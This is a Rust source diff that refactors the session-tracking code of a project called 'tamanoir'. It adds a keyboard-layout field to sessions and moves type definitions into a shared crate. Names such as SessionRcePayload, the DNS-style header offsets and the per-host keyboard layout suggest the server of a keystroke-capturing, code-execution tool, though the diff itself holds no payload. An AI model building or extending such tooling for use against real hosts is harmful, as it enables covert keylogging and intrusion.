@@ -7,94 +7,26 @@ use chrono::{DateTime, Utc};
 pub mod tamanoir_grpc {
     tonic::include_proto!("tamanoir");
 }
-use core::fmt;
+
 use std::{
     collections::HashMap,
     fs,
     net::{Ipv4Addr, SocketAddr},
-    str::FromStr,
     sync::Arc,
 };
 
 use home::home_dir;
 use serde::Deserialize;
+use tamanoir_common::{Layout, TargetArch};
 use tokio::sync::{
     broadcast::{self, Sender},
     Mutex,
 };
-
 const AR_COUNT_OFFSET: usize = 10;
 const AR_HEADER_LEN: usize = 12;
 const FOOTER_TXT: &str = "r10n4m4t/";
 const FOOTER_EXTRA_BYTES: usize = 3;
 const FOOTER_LEN: usize = FOOTER_TXT.len() + FOOTER_EXTRA_BYTES;
-
-#[derive(Debug, Clone, PartialEq, Deserialize)]
-pub enum TargetArch {
-    X86_64,
-    Aarch64,
-}
-#[derive(Debug, Clone, PartialEq)]
-pub enum Engine {
-    Docker,
-    Podman,
-}
-impl fmt::Display for TargetArch {
-    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
-        match self {
-            TargetArch::X86_64 => write!(f, "x86_64"),
-            TargetArch::Aarch64 => write!(f, "aarch64"),
-        }
-    }
-}
-impl fmt::Display for Engine {
-    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
-        match self {
-            Engine::Docker => write!(f, "docker"),
-            Engine::Podman => write!(f, "podman"),
-        }
-    }
-}
-impl FromStr for Engine {
-    type Err = String;
-
-    fn from_str(s: &str) -> Result<Self, Self::Err> {
-        match s {
-            "docker" => Ok(Engine::Docker),
-            "podman" => Ok(Engine::Podman),
-            _ => Err(format!("{} engine isn't implmented", s)),
-        }
-    }
-}
-
-impl FromStr for TargetArch {
-    type Err = String;
-
-    fn from_str(s: &str) -> Result<Self, Self::Err> {
-        match s {
-            "x86_64" => Ok(TargetArch::X86_64),
-            "aarch64" => Ok(TargetArch::Aarch64),
-            _ => Err(format!("{} arch isn't implmented", s)),
-        }
-    }
-}
-enum Layout {
-    Qwerty = 0,
-    Azerty = 1,
-    Unknown = 2,
-}
-impl From<u8> for Layout {
-    fn from(value: u8) -> Self {
-        match value {
-            0 => Self::Qwerty,
-            1 => Self::Azerty,
-            _ => Self::Unknown,
-        }
-    }
-}
-impl TargetArch {
-    pub const ALL: [Self; 2] = [Self::X86_64, Self::Aarch64];
-}
 
 #[derive(Debug, Deserialize, Clone)]
 pub struct SessionRcePayload {
@@ -111,6 +43,7 @@ pub struct Session {
     pub first_packet: DateTime<Utc>,
     pub latest_packet: DateTime<Utc>,
     pub n_packets: usize,
+    pub keyboard_layout: Layout,
 }
 impl Session {
     pub fn new(sock_addr: SocketAddr) -> Option<Self> {
@@ -123,6 +56,7 @@ impl Session {
                 first_packet: now_utc,
                 latest_packet: now_utc,
                 n_packets: 1,
+                keyboard_layout: Layout::Azerty,
             }),
             _ => None,
         }
@@ -160,6 +94,9 @@ impl Session {
             }
             _ => Err(format!("target arch {:#?} unavailable", target_arch)),
         }
+    }
+    pub fn set_layout(&mut self, layout: Layout) {
+        self.keyboard_layout = layout
     }
 }
 
